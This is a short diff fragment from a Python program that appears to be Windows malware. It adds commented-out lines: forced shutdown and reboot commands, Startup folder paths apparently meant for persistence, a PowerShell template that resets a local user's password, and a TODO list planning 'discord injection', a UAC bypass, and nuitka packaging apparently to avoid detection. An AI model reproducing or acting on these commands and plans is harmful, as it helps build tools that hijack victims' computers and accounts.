@@ -1193,3 +1193,28 @@ if check_internet():
 else: Startup(sys.argv[0])
 
 
+
+
+#subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+#subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+#C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+
+#C:\Users\USER\AppData\Roaming\MicrosoftWindows\System
+
+
+
+#f"Get-LocalUser -Name '{username}' | Reset-LocalUserPassword -NewPassword (ConvertTo-SecureString -String '{password}' -AsPlainText -Force)"
+
+
+
+# TODO
+# discord injection
+# uac bypass
+# use nuitka instead of pyinstaller
+# TODO
+
